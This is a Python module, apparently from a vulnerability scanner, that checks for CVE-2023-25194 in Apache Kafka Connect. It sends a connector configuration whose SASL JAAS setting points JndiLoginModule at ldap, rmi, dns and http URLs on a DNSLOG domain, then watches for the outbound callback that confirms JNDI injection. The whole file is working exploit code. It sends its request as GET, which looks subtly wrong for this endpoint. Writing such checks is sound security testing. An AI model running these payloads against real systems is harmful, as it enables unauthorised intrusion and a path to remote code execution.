#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

base_data = '''{"name": "test", 
   "config":
    {
        "connector.class":"io.debezium.connector.mysql.MySqlConnector",
      "database.hostname": "localhost",
      "database.port": "3306",
      "database.user": "root",
      "database.password": "123456",
      "database.dbname": "mysql",
      "database.sslmode": "SSL_MODE",
        "database.server.id": "1234",
      "database.server.name": "localhost",
        "table.include.list": "MYSQL_TABLES",
      "tasks.max":"1",
        "topic.prefix": "aaa22",
        "debezium.source.database.history": "io.debezium.relational.history.MemoryDatabaseHistory",
        "schema.history.internal.kafka.topic": "aaa22",
        "schema.history.internal.kafka.bootstrap.servers": "localhost:9092",
      "database.history.producer.security.protocol": "SASL_SSL",
      "database.history.producer.sasl.mechanism": "PLAIN",
      "database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\"PAYLOAD\\" useFirstPass=\\"true\\" serviceName=\\"x\\" debug=\\"true\\" group.provider.url=\\"xxx\\";"
    }
}'''

cve_2023_25194_payloads = [
    {
        'path': 'connectors',
        'data': base_data.replace('PAYLOAD', 'ldap://DNSDOMAIN'),
    },
    {
        'path': 'connectors',
        'data': base_data.replace('PAYLOAD', 'rmi://DNSDOMAIN'),
    },
    {
        'path': 'connectors',
        'data': base_data.replace('PAYLOAD', 'dns://DNSDOMAIN'),
    },
    {
        'path': 'connectors',
        'data': base_data.replace('PAYLOAD', 'http://DNSDOMAIN'),
    },
]

def cve_2023_25194_scan(clients):
    ''' 攻击者在可以控制Apache Kafka Connect 客户端的情况下
        可通过SASL JAAS 配置和基于 SASL 的安全协议在其上创建或修改连接器
        触发JNDI代码执行漏洞
    '''
    client = clients.get('reqClient')
    sessid = '3b12aef95938e027ecb9e88fc9315d11'
    
    vul_info = {
        'app_name': 'ApacheKafka',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2023-25194',
    }
    
    headers = {
        'Content-Type': 'application/json'
    }

    for payload in cve_2023_25194_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * DNSLOG域名
        
        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'get',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                                # * dns查询可能较慢, 等一会
        if (dns.result(md, sessid)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
